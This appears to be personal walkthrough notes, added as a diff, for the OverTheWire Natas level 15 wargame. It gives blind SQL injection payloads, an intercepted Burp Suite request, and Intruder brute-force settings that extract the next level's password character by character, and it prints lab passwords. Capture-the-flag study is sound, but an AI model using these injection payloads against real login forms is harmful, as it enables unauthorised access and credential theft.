@@ -1,0 +1,110 @@
+PASSWORD: TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
+
+natas16
+This user exists.
+
+natas16" and 1=1
+Error in query.
+
+natas16" and "1"="1
+This user exists.
+
+natas16" and (SELECT SLEEP(10))#  <-----CONFIRMS THAT THE MYSQLI DATABASE IS MYSQL*
+This user doesn't exist.   <-----EXECUTION 
+
+*BURP SUITE*
+Intercept is on
+
+natas16" and (SELECT SLEEP(10))#
+
+Send to repeater
+
+Intercept is off
+
+Open Repeater
+
+POST /index.php HTTP/1.1
+Host: natas15.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 53
+Origin: http://natas15.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==
+Connection: close
+Referer: http://natas15.natas.labs.overthewire.org/
+Upgrade-Insecure-Requests: 1
+
+username=natas16" and (select length(password)>1 from users where username="natas16")#  <----URL ENCODE LINE OF CODE
+
+" and (select length(password)>1 from users where username="natas16")#  <-----COPY THEN PRESS CTRL+U to ENCODE LINE OF CODE
+
+*PRESS SEND
+
+RESPONSE = This user exists.
+
+username=natas16"+and+(select+length(password)%3d1+from+users+where+username%3d"natas16")%23
+
+*RESPONSE = This user doesn't exist
+
+*SEND to Intruder
+
+PRESS CLEAR$
+
+username=natas16"+and+(select+length(password)%3d1+from+users+where+username%3d"natas16")%23  <-----Highlight the "1" where password is =%3d1
+
+PRESS ADD$
+
+username=natas16"+and+(select+length(password)%3d§1§+from+users+where+username%3d"natas16")%23)
+
+PAYLOADS
+PAYLOAD SET 1
+PAYLOAD TYPE Numbers
+sequential from 1 to 40 <-----To FIND OUT THE LENGTH OF THE PASSWORD
+
+*START ATTACK 
+*CLICK Lengnth to find out the shortest OUTPUT POST. THE NUMBER 32 HAS THE SHORTEST OUTPUT POST, SO THE LENGTH OF THE PASSWORD IS 32 CHARACTERS
+
+*CLICK ON 32 THEN CLICK RESPONSE and it SHOWS This user exists.
+
+*SUBSTRING*
+You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.
+I.E. SUBSTRING('foobar', 4, 2)
+
+natas16" and (select+substring(password, 1, 1) from users where username="natas16")='a'#  <-----COPY THEN PRESS CTRL+U to URL ENCODE LINE OF CODE
+
+username=natas16"+and+(select+substring(password,+1,+1)+from+users+where+username%3d"natas16")='a'%23  <-----URL ENCODED
+
+*SEND TO Intruder
+
+*PRESS CLEAR$
+
+username=natas16"+and+(select+substring(password,+1,+1)+from+users+where+username%3d"natas16")='a'%23  <----- HIGHLIGHT THE FIRST 1 AND THE a
+
+*PRESS ADD$
+
+username=natas16"+and+(select+substring(password,+§1§,+1)+from+users+where+username%3d"natas16")='§a§'%23 
+
+*CHOOSE TYPE OF ATTACK
+Cluster BOMB (BRUTE FORCE)
+PAYLOADS
+PAYLOAD SET 1
+PAYLOAD TYPE Numbers
+sequential from 1 to 32
+
+PAYLOAD SET 2 Brute forcer
+PAYLOAD TYPE Numbers
+CHARACTOR SET ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+MIN LENGTH 1
+MAX LENGTH 1
+
+*ENTER LIKE BINARY TO KEEP CASE-SENSITIVE
+
+username=natas16"+and+(select+substring(password,+§1§,+1)+from+users+where+username%3d"natas16")+LIKE+BINARY+'§a§'%23
+
+*START ATTACK*
+*CLICK Lengnth to find out the shortest OUTPUT POST. THEN *CLICK PAYLOAD 1 TO GET THE ORDER OF THE 32 CHARACTERS IN THE PASSWORD! 
+
+TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V  <-----PASSWORD
